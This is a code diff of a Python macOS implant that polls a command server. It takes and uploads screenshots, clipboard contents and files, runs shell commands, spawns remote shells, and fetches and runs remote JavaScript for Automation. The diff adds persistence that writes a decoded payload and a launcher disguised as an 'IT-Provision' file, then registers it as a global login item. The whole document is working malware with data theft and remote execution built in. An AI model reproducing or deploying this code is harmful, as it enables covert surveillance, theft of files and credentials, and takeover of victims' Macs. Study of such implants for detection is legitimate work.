@@ -1,28 +1,12 @@
-import pwd
-import urllib2
-import urllib
-import sys
-import os
-import random
-import ssl
-import time
-import commands
-import AppKit
-from AppKit import NSPasteboard, NSStringPboardType
-import glob
+import pwd, urllib2, urllib, sys, os, random, ssl, time, commands, AppKit, glob, platform, getpass, Foundation, SystemConfiguration, LaunchServices, PyObjCTools
+from AppKit import *
 from glob import glob
-import platform
-import getpass
-import Foundation
 from Foundation import *
 from Cocoa import *
 from objc import *
-import SystemConfiguration
-import LaunchServices
-import PyObjCTools
 from PyObjCTools import *
 from PyObjCTools import Conversion
-from LaunchServices import kLSSharedFileListSessionLoginItems, kLSSharedFileListNoUserInteraction
+from LaunchServices import kLSSharedFileListSessionLoginItems, kLSSharedFileListNoUserInteraction, kLSSharedFileListGlobalLoginItems
 from Foundation import NSBundle
 import inspect
 import grp
@@ -31,19 +15,23 @@ import Quartz.CoreGraphics as CG
 from Cocoa import NSURL
 import subprocess
 import shutil
+import CoreFoundation
+from SystemConfiguration import *
+import base64
 
 
 letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890'
 token = ''.join(random.choice(letters) for i in range(254))
 token2 = 'Bearer valid' + token
 sleep = 10
+fdata = ''
 
 
 ####################
 def screenshot():
     try:
         region = CG.CGRectInfinite
-        path = '/private/var/tmp/out.png'
+        path = '/Users/Shared/out.png'
         image = CG.CGWindowListCreateImage(region, CG.kCGWindowListOptionOnScreenOnly, CG.kCGNullWindowID, CG.kCGWindowImageDefault)
         imagepath = NSURL.fileURLWithPath_(path)
         dest = Quartz.CGImageDestinationCreateWithURL(imagepath, LaunchServices.kUTTypePNG, 1, None)
@@ -51,7 +39,7 @@ def screenshot():
         Quartz.CGImageDestinationAddImage(dest, image, properties)
         x = Quartz.CGImageDestinationFinalize(dest)
                 
-        with open('/private/var/tmp/out.png', 'rb') as fl:
+        with open('/Users/Shared/out.png', 'rb') as fl:
             x = fl.read()
             vals = {'content':x}
             srvr = 'https://127.0.0.1/validatiion/profile/1'
@@ -59,7 +47,7 @@ def screenshot():
             resp = urllib2.urlopen(req,context=context)
             respn = resp.read()
         fl.close()
-        os.remove('/private/var/tmp/out.png')
+        os.remove('/Users/Shared/out.png')
  
     except Exception as e:
         vals = {'content':e}
@@ -71,7 +59,7 @@ def screenshot():
 
 #####################
 def download(data):
-    data2 = str(data).replace('download ',"")
+    data2 = str(data).replace('["download ',"")
     if os.path.exists(data2):
         try:
             with open ("%s" % str(data2), 'rb') as file:
@@ -150,7 +138,7 @@ def listdir():
 ###########################
 def cd(data):
     try:
-        data2 = data.replace('cd ','')
+        data2 = data.replace('["cd ','')
         os.chdir(data2)
         a = {'content':'[+] Successfully changed dir to %s'%data2}
         b = 'https://127.0.0.1/validatiion/profile/4'
@@ -356,18 +344,24 @@ def checksecurity():
         d = urllib2.urlopen(c,context=context)
         e = d.read()
 #################################
-def persist():
+def persist(data):
     try:
-        lfile = open('/private/var/tmp/IT-Provision.command', 'w')
-        lfile.write('#!/bin/zsh\n\n')
-        lfile.write('python /private/var/tmp/IT-Provision.py &')
+        lfile = open('/Users/Shared/~$IT-Provision.command', 'w')
+        lfile.write('#!/usr/bin/python\n\n')
+        lfile.write('import subprocess\n\n')
+        lfile.write("subprocess.Popen('python /Users/Shared/\"~\$IT-Provision.py\" &',shell=True)")
         lfile.close()
-        st = os.stat("/private/var/tmp/IT-Provision.command")
-        os.chmod("/private/var/tmp/IT-Provision.command",st.st_mode | 0o111)
+        st = os.stat("/Users/Shared/~$IT-Provision.command")
+        os.chmod("/Users/Shared/~$IT-Provision.command",st.st_mode | 0o111)
+        
+        ofile = open('/Users/Shared/~$IT-Provision.py', 'wb')
+        datal = base64.b64decode(data)
+        ofile.write(datal)
 
-        shutil.copy(__file__, '/private/var/tmp/IT-Provision.py')
-        st = os.stat("/private/var/tmp/IT-Provision.py")
-        os.chmod("/private/var/tmp/IT-Provision.py",st.st_mode | 0o111)
+        ofile.close()
+        st = os.stat("/Users/Shared/~$IT-Provision.py")
+        os.chmod("/Users/Shared/~$IT-Provision.py",st.st_mode | 0o111)
+        
         SFL_bundle = NSBundle.bundleWithIdentifier_('com.apple.coreservices.SharedFileList')
         functions  = [('LSSharedFileListCreate',              '^{OpaqueLSSharedFileListRef=}^{__CFAllocator=}^{__CFString=}@'),
                       ('LSSharedFileListCopySnapshot',        '^{__CFArray=}^{OpaqueLSSharedFileListRef=}o^I'),
@@ -377,15 +371,22 @@ def persist():
                       ('LSSharedFileListItemRemove',          'i^{OpaqueLSSharedFileListRef=}^{OpaqueLSSharedFileListItemRef=}'),
                       ('LSSharedFileListInsertItemURL',       '^{OpaqueLSSharedFileListItemRef=}^{OpaqueLSSharedFileListRef=}^{OpaqueLSSharedFileListItemRef=}^{__CFString=}^{OpaqueIconRef=}^{__CFURL=}^{__CFDictionary=}^{__CFArray=}'),
                       ('kLSSharedFileListItemBeforeFirst',    '^{OpaqueLSSharedFileListItemRef=}'),
-                      ('kLSSharedFileListItemLast',           '^{OpaqueLSSharedFileListItemRef=}'),]
+                      ('kLSSharedFileListItemLast',           '^{OpaqueLSSharedFileListItemRef=}'),
+                      ('LSSharedFileListSetAuthorization',           'i^{OpaqueLSSharedFileListRef=}^{AuthorizationOpaqueRef=}'),
+                      ('AuthorizationCreate',           'i^{_AuthorizationRights=I^{_AuthorizationItem=^cQ^vI}}^{_AuthorizationEnvironment=I^{_AuthorizationItem=^cQ^vI}}I^^{AuthorizationOpaqueRef=}'),]
         objc.loadBundleFunctions(SFL_bundle, globals(), functions)
-        list_ref = LSSharedFileListCreate(None, kLSSharedFileListSessionLoginItems, None)
-        login_items,_ = LSSharedFileListCopySnapshot(list_ref, None)
-        x = [list_ref,login_items]
-        lref, citems = x
-        added_item = NSURL.fileURLWithPath_('/var/tmp/IT-Provision.command')
-        dpoint = kLSSharedFileListItemLast
-        result = LSSharedFileListInsertItemURL(lref,dpoint,None,None,added_item,{},[])
+
+        auth = SFAuthorization.authorization().authorizationRef()
+        ref = SCPreferencesCreateWithAuthorization(None, "/Users/Shared/~$IT-Provision.command", "/Users/Shared/~$IT-Provision.command", auth)
+
+        
+        temp = CoreFoundation.CFURLCreateFromFileSystemRepresentation(kCFAllocatorDefault,'/Users/Shared/~$IT-Provision.command',39,False)
+        items = LSSharedFileListCreate(kCFAllocatorDefault, kLSSharedFileListGlobalLoginItems, None)
+
+        myauth = LSSharedFileListSetAuthorization(items,auth)
+        name = CFStringCreateWithCString(None,'/Users/Shared/~$IT-Provision.command',kCFStringEncodingASCII)
+        itemRef = LSSharedFileListInsertItemURL(items,kLSSharedFileListItemLast,name,None,temp,None,None)
+        
         sendstring = "[+] Login Item persistence successful"
         a = {'content':sendstring}
         b = 'https://127.0.0.1/validatiion/profile/18'
@@ -410,24 +411,33 @@ def unpersist():
                       ('LSSharedFileListItemRemove',          'i^{OpaqueLSSharedFileListRef=}^{OpaqueLSSharedFileListItemRef=}'),
                       ('LSSharedFileListInsertItemURL',       '^{OpaqueLSSharedFileListItemRef=}^{OpaqueLSSharedFileListRef=}^{OpaqueLSSharedFileListItemRef=}^{__CFString=}^{OpaqueIconRef=}^{__CFURL=}^{__CFDictionary=}^{__CFArray=}'),
                       ('kLSSharedFileListItemBeforeFirst',    '^{OpaqueLSSharedFileListItemRef=}'),
-                      ('kLSSharedFileListItemLast',           '^{OpaqueLSSharedFileListItemRef=}'),]
- 
+                      ('kLSSharedFileListItemLast',           '^{OpaqueLSSharedFileListItemRef=}'),
+                      ('LSSharedFileListSetAuthorization',           'i^{OpaqueLSSharedFileListRef=}^{AuthorizationOpaqueRef=}'),
+                      ('AuthorizationCreate',           'i^{_AuthorizationRights=I^{_AuthorizationItem=^cQ^vI}}^{_AuthorizationEnvironment=I^{_AuthorizationItem=^cQ^vI}}I^^{AuthorizationOpaqueRef=}'),]
+        
         objc.loadBundleFunctions(SFL_bundle, globals(), functions)
-        list_ref = LSSharedFileListCreate(None, kLSSharedFileListSessionLoginItems, None)
+
+        auth = SFAuthorization.authorization().authorizationRef()
+        ref = SCPreferencesCreateWithAuthorization(None, "/Users/Shared/~$IT-Provision.command", "/Users/Shared/~$IT-Provision.command", auth)
+
+        temp = CoreFoundation.CFURLCreateFromFileSystemRepresentation(kCFAllocatorDefault,'/Users/Shared/~$IT-Provision.command',39,False)
+        
+        
+        list_ref = LSSharedFileListCreate(kCFAllocatorDefault, kLSSharedFileListGlobalLoginItems, None)
         login_items,_ = LSSharedFileListCopySnapshot(list_ref, None)
         x = [list_ref, login_items]
         url_list = []
         for items in x[1]:
             err, a_CFURL, a_FSRef = LSSharedFileListItemResolve(items, kLSSharedFileListNoUserInteraction + kLSSharedFileListNoUserInteraction, None, None)
             url_list.append(a_CFURL)
-        path = NSURL.fileURLWithPath_('/private/var/tmp/IT-Provision.command')
+        path = NSURL.fileURLWithPath_('/Users/Shared/~$IT-Provision.command')
         if path in url_list:
             i = url_list.index(path)
             target = login_items[i]
             result = LSSharedFileListItemRemove(list_ref, target)
 
-        os.remove('/private/var/tmp/IT-Provision.command')
-        os.remove('/private/var/tmp/IT-Provision.py')
+        os.remove('/Users/Shared/~$IT-Provision.command')
+        os.remove('/Users/Shared/~$IT-Provision.py')
         sendstring = "[+] Login Item persistence and files removed"
         a = {'content':sendstring}
         b = 'https://127.0.0.1/validatiion/profile/19'
@@ -442,7 +452,7 @@ def unpersist():
         e = d.read()
 #############################
 def catfile(data):
-    data2 = str(data).replace('cat ',"")
+    data2 = str(data).replace('["cat ',"")
     if os.path.exists(data2):
         try:
             with open ("%s" % str(data2), 'rb') as file:
@@ -491,7 +501,7 @@ def whoami():
 ##############################
 def srun(data):
     try:
-        data2 = str(data).replace('shell ',"")
+        data2 = str(data).replace('["shell ',"")
         sendstring = str(commands.getstatusoutput("%s" % data2))
         a = {'content':sendstring}
         b = 'https://127.0.0.1/validatiion/profile/16'
@@ -507,7 +517,7 @@ def srun(data):
 ###############################
 def sspawn(data):
     try:
-        data2 = data.replace("spawn ","")
+        data2 = data.replace('["spawn ',"")
         data3 = data2.split(':')
         ip = data3[0]
         port = data3[1]
@@ -532,13 +542,38 @@ def ckin():
         request = urllib2.Request(url2,headers=headers)
         response = urllib2.urlopen(request,context=context)
         data_read = response.read()
-        datalist = str(data_read).replace("\"","").replace("[","").replace("]","").split(',')
+        datalist = str(data_read).split('+++++')
         return datalist
     except Exception as e:
         pass
 ################################
+def runjxa(data):
+    try:
+        data2 = data.replace('["runjxa ',"")
+        req = urllib2.Request(data2)
+        rsp = urllib2.urlopen(req)
+        app = rsp.read()
+        appfile = open('app.js','w')
+        appfile.write(app)
+        appfile.close()
+
+        scmd = "osascript app.js"
+        subprocess.Popen(scmd,shell=True)
+        p2 = '[+] JXA file successfully executed'
+        a = {'content':p2}
+        b = 'https://127.0.0.1/validatiion/profile/20'
+        c = urllib2.Request(b,headers=headers,data=a.get('content'))
+        d = urllib2.urlopen(c,context=context)
+        e = d.read()
+    except Exception as e:
+        a = {'error':str(e)}
+        b = 'https://127.0.0.1/validatiion/profile/20'
+        c = urllib2.Request(b,headers=headers,data=a.get('error'))
+        d = urllib2.urlopen(c,context=context)
+        e = d.read()
+################################
 def slp(data):
-    data2 = data.replace("sleep ","")
+    data2 = data.replace('["sleep ',"")
     data3 = int(data2)
     return data3
 ################################
@@ -550,62 +585,68 @@ context = ssl._create_unverified_context()
 request = urllib2.Request(url1,headers=headers)
 response = urllib2.urlopen(request,context=context)
 
-time.sleep(2)
-    
+time.sleep(1)
+
 while True:
     rslts = ckin()
     if not rslts:
         pass
     else:
+        datastr = ''
         for each in rslts:
+            data = each.replace('+++++','')
             
-            data = each.lstrip().strip()
-            if data.find('exit') != -1:
+            if (data[:6] == '["exit') or (data == '", "exit'):
                 sys.exit(0)
-            elif data.find('screencapture') != -1:
+            elif (data[:12] == '["screenshot') or (data == '", "screenshot'):
                 screenshot()           
-            elif data.find('download ') != -1:
+            elif (data[:11] == '["download ') or (data == '", "download '):
                 download(data)
-            elif data.find('clipboard') != -1:
+            elif (data[:11] == '["clipboard') or (data == '", "clipboard'):
                 clipboard()
-            elif data == 'pwd':
+            elif (data[:5] == '["pwd') or (data == '", "pwd'):
                 pwd()
-            elif data == 'listdir':
+            elif (data[:9] == '["listdir') or (data == '", "listdir'):
                 listdir()
-            elif data.find('cd ') != -1 and 'shell' not in data:
+            elif (data[:5] == '["cd ') or (data == '", "cd '):
                 cd(data)
-            elif data == 'systeminfo':
+            elif (data[:12] == '["systeminfo') or (data == '", "systeminfo'):
                 systeminfo()
-            elif data == 'listusers':
+            elif (data[:11] == '["listusers') or (data == '", "listusers'):
                 listusers()
-            elif data == 'addresses':
+            elif (data[:11] == '["addresses') or (data == '", "addresses'):
                 addresses()
-            elif data == 'prompt':
+            elif (data[:8] == '["prompt') or (data == '", "prompt'):
                 prompt()
-            elif data == 'userhist':
+            elif (data[:10] == '["userhist') or (data == '", "userhist'):
                 userhist()
-            elif data == 'checksecurity':
+            elif (data[:15] == '["checksecurity') or (data == '", "checksecurity'):
                 checksecurity()
-            elif data == 'persist':
-                persist()
-            elif data == 'unpersist':
+            elif (data[:11] == '["unpersist') or (data == '", "unpersist'):
                 unpersist()
-            elif ('cat ' in data) and ('shell' not in data):
+            elif (data[:6] == '["cat ') or (data == '", "cat '):
                 catfile(data)
-            elif data == 'whoami':
+            elif (data[:8] == '["whoami') or (data == '", "whoami'):
                 whoami()
-            elif 'shell ' in data:
+            elif (data[:8] == '["shell ') or (data == '", "shell '):
                 srun(data)
-            elif 'spawn ' in data:
+            elif (data[:8] == '["spawn ') or (data == '", "spawn '):
                 sspawn(data)
-            elif 'sleep ' in data:
+            elif (data[:8] == '["sleep ') or (data == '", "sleep '):
                 sleep = slp(data)
-        
-    time.sleep(sleep)
+            elif (data[:9] == '["runjxa ') or (data == '", "runjxa '):
+                runjxa(data)
+            elif data == '"]':
+                pass
+            else:
+                for p in data:
+                    datastr = datastr + p.replace('["','')
+                    data.replace('','')[:-2].replace(r'\n', '\n')
 
-    
-    
-                
+        if datastr:
+            datastr2 = datastr[2:]
+            persist(datastr2)
+
             
-                    
+    time.sleep(sleep)
 
